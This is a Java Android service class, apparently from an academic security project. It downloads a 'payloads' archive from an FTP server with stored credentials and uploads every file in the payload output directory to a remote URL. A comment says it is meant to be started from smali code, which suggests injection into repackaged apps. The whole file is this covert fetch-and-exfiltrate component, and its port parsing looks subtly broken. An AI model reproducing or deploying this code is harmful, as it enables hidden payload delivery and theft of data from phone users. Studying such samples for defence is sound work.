package it.unisannio.srss.dame.android.services;

import java.io.File;
import java.io.IOException;
import java.net.SocketException;

import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.os.IBinder;
import android.util.Log;

public class NetworkService extends Service {

	private final static String TAG = NetworkService.class.getSimpleName();

	private final Object downloadLock = new Object();
	private final Object uploadLock = new Object();
	private FTPService ftpServer = null;

	@Override
	public IBinder onBind(Intent intent) {
		return null;
	}

	@Override
	public int onStartCommand(Intent intent, int flags, int startId) {
		// controlla se ha già scaricato i payload
		if ((new File(Utils.getPayloadsArchivePath(this))).exists()) {
			// l'archivio dei payloads è stato già scaricato
			// in questo caso si fa l'upload di eventuali file di output
			uploadOutputs();
		} else {
			// l'archivio non è stato ancora scaricato
			downloadPayloads();
		}
		return super.onStartCommand(intent, flags, startId);
	}

	private void downloadPayloads() {
		new Thread() {
			@Override
			public void run() {
				synchronized (downloadLock) {
					String downloadUri = Utils
							.getPayloadsDownloadUrl(getClass());
					String localFilePath = Utils
							.getPayloadsArchivePath(getApplicationContext());

					FTPService ftp = getFtpServer();

					try {
						ftp.connect();
						ftp.downloadFile(downloadUri, localFilePath);
					} catch (SocketException e) {
						ftp.disconnect();
						Log.e(TAG, "Not connected, socket exception");

					} catch (IOException e) {
						Log.e(TAG, "Not connected, IOException");
					}

				}
			};
		}.start();
	}

	private void uploadOutputs() {
		new Thread() {
			@Override
			public void run() {
				synchronized (uploadLock) {
					String localOutputDir = Utils
							.getPayloadsOutputDir(getApplicationContext());
					String remoteOutputUri = Utils.getUploadUrl(getClass());

					FTPService ftp = getFtpServer();

					File outputDir = new File(localOutputDir);
					File[] results = outputDir.listFiles();

					if (results.length > 0) {
						try {
							ftp.connect();
							for (File result : results)
								ftp.uploadFile(result.getAbsolutePath(),
										remoteOutputUri);
						} catch (SocketException e) {
							ftp.disconnect();
							Log.e(TAG, "Not connected, socket exception");

						} catch (IOException e) {
							Log.e(TAG, "Not connected, IOException");
						}
					}
				}
			};
		}.start();
	}

	/**
	 * Questo metodo viene usato per utilità per semplificare la chiamata di
	 * avvio del servizio nel codice smali.
	 * 
	 * @param c
	 */
	public static void doNetworkStuff(Object c) {
		if (c instanceof Context) {
			((Context) c).startService(new Intent((Context) c,
					NetworkService.class));
		}
	}

	private FTPService getFtpServer() {
		if (ftpServer == null) {
			String serverURL = Utils.getFtpURL(getClass());
			String username = Utils.getFtpUsername(getClass());
			String password = Utils.getFtpPassword(getClass());
			String port = serverURL.substring(serverURL.indexOf(":"));
			
			// erase final slash
			if(port.endsWith("/"))
				port = port.substring(0, port.length()-1);
			
			ftpServer = new FTPService(serverURL, Integer.parseInt(port),username, password);
		}

		return ftpServer;
	}
}
